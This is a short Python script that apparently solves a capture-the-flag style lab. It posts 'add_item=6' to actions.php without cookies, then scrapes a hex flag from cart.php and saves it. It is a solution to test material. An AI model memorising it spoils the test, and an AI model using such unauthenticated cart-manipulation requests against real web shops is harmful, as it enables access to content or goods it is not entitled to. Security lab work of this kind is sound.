#!/usr/bin/env python3
import requests
import re
import sys

def main():

    BASE_URL = sys.argv[2].rstrip('/')  # remove trailing slash if any
    output_file = sys.argv[4]

    with requests.Session() as s:
        # 1) POST add_item=6 without cookies
        post_data = {'add_item': '6'}
        response1 = s.post(f'http://{BASE_URL}:8005/actions.php', data=post_data, timeout=30)
        print('POST /actions.php status:', response1.status_code)

        # 2) GET cart.php and search for the flag
        response2 = s.get(f'http://{BASE_URL}:8005/cart.php', timeout=30)
        content = response2.text

        match = re.search(r'FLAG - ([a-f0-9]{40,})', content)
        if match:
            flag = match.group(1)
            print(flag)
            with open(output_file, 'w') as f:
                f.write(flag)
        else:
            print('Flag not found.')
            with open(output_file, 'w') as f:
                f.write('Flag not found.\n')

if __name__ == "__main__":
    main()
